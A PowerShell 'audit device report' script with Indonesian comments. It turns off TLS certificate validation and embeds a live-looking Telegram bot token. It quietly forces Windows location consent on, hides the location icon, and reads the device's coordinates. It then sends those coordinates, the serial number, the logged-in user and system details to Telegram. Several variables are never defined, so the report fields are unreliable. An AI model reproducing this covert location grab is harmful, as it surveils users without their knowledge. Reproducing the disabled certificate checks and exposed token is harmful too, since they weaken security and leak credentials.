# --- FIX SSL/TLS TRUST RELATIONSHIP ---
# Baris ini memerintahkan PowerShell untuk menerima semua sertifikat SSL (Mengatasi error Trust Relationship)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- KONFIGURASI TELEGRAM ---
$TelegramToken = "8717446156:AAGhWMtcY1HgArk-aVZCEXj1aco7E6FEBhY"
$TelegramChatID = "1229343863"

# --- [PRIVACY TOGGLE: ON] NYALAKAN AKSES LOKASI SEMENTARA ---
try {
    Set-Service -Name "lfsvc" -StartupType Manual -ErrorAction SilentlyContinue
    Start-Service -Name "lfsvc" -ErrorAction SilentlyContinue

    $ConsentPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location"
    )
    foreach ($path in $ConsentPaths) {
        if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
        Set-ItemProperty -Path $path -Name "Value" -Value "Allow" -ErrorAction SilentlyContinue
    }
    
    $PrivPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Privacy"
    if (-not (Test-Path $PrivPath)) { New-Item -Path $PrivPath -Force | Out-Null }
    Set-ItemProperty -Path $PrivPath -Name "LocationIconStatus" -Value 0 -ErrorAction SilentlyContinue
} catch {}

# --- PENGUMPULAN DATA ---
$Hostname = $env:COMPUTERNAME
$SN = (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber
$User = if ($Expl = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'") { (Invoke-CimMethod -InputObject $Expl[0] -MethodName GetOwner).User } else { $env:USERNAME }

# 1. Resource Usage
$CPU = [Math]::Round((Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue, 1)
$RAMUsage = [Math]::Round(((Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize - (Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory) / (Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize * 100, 1)
$DiskUsage = [Math]::Round((Get-Counter '\LogicalDisk(C:)\% Disk Time' -MaxSamples 1).CounterSamples.CookedValue, 1)
if ($DiskUsage -gt 100) { $DiskUsage = 100 }
$NetUsage = [Math]::Round(((Get-Counter '\Network Interface(*)\Bytes Total/sec' -ErrorAction SilentlyContinue).CounterSamples.CookedValue | Measure-Object -Sum).Sum / 1KB, 1)
try { $GPUUsage = [Math]::Round(((Get-Counter '\GPU Engine(*)\Utilization Percentage' -ErrorAction SilentlyContinue).CounterSamples.CookedValue | Measure-Object -Sum).Sum, 1) } catch { $GPUUsage = 0 }

# 2. Logika Baterai Health
$BatteryString = "PC Desktop / (No Battery)"
$ReportPath = "$env:TEMP\bat_audit.html"
try {
    powercfg /batteryreport /output $ReportPath | Out-Null
    Start-Sleep -Seconds 2
    if (Test-Path $ReportPath) {
        $Html = Get-Content $ReportPath -Raw
        $DMatch = [regex]::Match($Html, 'DESIGN CAPACITY.*?<td>([\d,.]+)\s*mWh')
        $FMatch = [regex]::Match($Html, 'FULL CHARGE CAPACITY.*?<td>([\d,.]+)\s*mWh')
        if ($DMatch.Success -and $FMatch.Success) {
            $DVal = [int]($DMatch.Groups[1].Value -replace '[,.]', '')
            $FVal = [int]($FMatch.Groups[1].Value -replace '[,.]', '')
            $Health = [math]::Round(($FVal / $DVal) * 100, 1)
            $BatteryString = "$Level ($Status)`n   └ Health: $Health% ($FVal / $DVal mWh)"
        }
        Remove-Item $ReportPath -Force -ErrorAction SilentlyContinue
    }
} catch { $BatteryString = "Error Reading" }

# 3. Storage Status
$DiskReport = ""
$TargetDrives = "C:", "D:", "E:"

foreach ($DriveLetter in $TargetDrives) {
    try {
        $Disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$DriveLetter'" -ErrorAction SilentlyContinue
        if ($Disk) {
            $FreeGB = [Math]::Round($Disk.FreeSpace / 1GB, 1)
            $TotalGB = [Math]::Round($Disk.Size / 1GB, 1)
            $PercentFree = [Math]::Round(($Disk.FreeSpace / $Disk.Size) * 100, 1)
            
            # Menentukan Ikon berdasarkan sisa kapasitas
            $Icon = if ($PercentFree -lt 10) { "🔴" } else { "🟢" }
            $DiskReport += "$Icon *$DriveLetter* $FreeGB GB / $TotalGB GB ($PercentFree%)`n"
        }
    } catch {
        # Jika drive tidak ada (misal laptop tidak punya D atau E), biarkan kosong
    }
}

# 4. PM Status & Uptime
try {
    $AVQuery = Get-CimInstance -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction SilentlyContinue
    
    # Filter agar hanya mengambil satu entri Kaspersky saja (mencegah duplikasi nama)
    $SelectedAV = $AVQuery | Where-Object { $_.displayName -like "*Kaspersky*" } | Select-Object -First 1
    
    if ($SelectedAV) {
        $AVName = $SelectedAV.displayName
        $RawTS = $SelectedAV.timestamp
        
        # Parsing tanggal dari string WMI
        if ($RawTS -match "\d{2}\s\w{3}\s\d{4}") { 
            $Split = $RawTS.Split(" ")
            # Format: Tgl-Bulan-Tahun
            $LastAVUpdate = "$($Split[1]) $($Split[2]) $($Split[3])"
        } else {
            $LastAVUpdate = (Get-Date).ToString("yyyy-MM-dd")
        }
    } else {
        $AVName = "Windows Defender"
        $LastAVUpdate = (Get-MpComputerStatus).AntivirusSignatureLastUpdated.ToString("yyyy-MM-dd")
    }
} catch { 
    $AVName = "Kaspersky Endpoint"; $LastAVUpdate = "Check App" 
}
$Uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$UptimeString = "{0} Hari, {1} Jam, {2} Menit" -f $Uptime.Days, $Uptime.Hours, $Uptime.Minutes

# 5. LOGIKA LOKASI
Add-Type -AssemblyName System.Device -ErrorAction SilentlyContinue
$Watcher = New-Object System.Device.Location.GeoCoordinateWatcher(1)
$Watcher.Start()
for ($i=0; $i -lt 30; $i++) { if ($Watcher.Position.Location.IsUnknown) { Start-Sleep -Milliseconds 500 } else { break } }
$Loc = $Watcher.Position.Location

if (!$Loc.IsUnknown -and $Loc.HorizontalAccuracy -gt 0) {
    $Acc = [Math]::Round($Loc.HorizontalAccuracy, 1)
    $Lat = $Loc.Latitude.ToString().Replace(",", "."); $Lon = $Loc.Longitude.ToString().Replace(",", ".")
} else {
    try {
        $IpInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/" -TimeoutSec 5
        $Lat = $IpInfo.lat.ToString().Replace(",", "."); $Lon = $IpInfo.lon.ToString().Replace(",", "."); $Acc = "Approx (IP)"
    } catch { $Acc = "N/A"; $Lat = "0"; $Lon = "0" }
}
$Watcher.Stop()

# --- [PRIVACY TOGGLE: OFF] MATIKAN SEMUA AKSES LOKASI KEMBALI ---
try {
    Stop-Service -Name "lfsvc" -Force -ErrorAction SilentlyContinue
    foreach ($path in $ConsentPaths) {
        Set-ItemProperty -Path $path -Name "Value" -Value "Deny" -ErrorAction SilentlyContinue
    }
} catch {}

# --- PENYUSUNAN PESAN ---
$Timestamp = Get-Date -Format "yyyy-MM-dd | HH:mm:ss"
$MapsLink = "https://www.google.com/maps?q=$Lat,$Lon"
$Message = "📍 *AUDIT DEVICE REPORT*`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "💻 *Hostname:* $Hostname`n" +
           "🔢 *Serial Number:* $SN`n" +
           "👤 *User:* $User`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "📊 *RESOURCE USAGE:*`n" +
           "📟 *CPU:* $CPU % | ⚡ *RAM:* $RAMUsage %`n" +
           "📁 *Disk:* $DiskUsage % | 🎨 *GPU:* $GPUUsage %`n" +
           "🔋 *Battery:* $BatteryString`n" +
           "📶 *Network:* $NetUsage Kbps`n" +
           "⏱️ *Uptime:* $UptimeString`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "💾 *SPACE STORAGE STATUS:*`n$DiskReport" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "⚙️ *PM STATUS:*`n" +
           "🛡️ *AV:* $AVName`n" +
           "📅 *AV Update:* $(Get-Date -Format 'dd MMM yyyy')`n" +
           "🔄 *Win Update:* $LastWinUpdate`n" +
           "🧹 *Last Defrag:* $LastDefrag`n" +
           "🎯 *Location Accuracy:* $Acc meter`n" +
           "⏰ *Report Sent:* $Timestamp`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "🔗 [Gmaps - Device Location]($MapsLink)"

# --- KIRIM ---
$Payload = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = "Markdown" }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$($TelegramToken)/sendMessage" -Method Post -Body $Payload -TimeoutSec 15
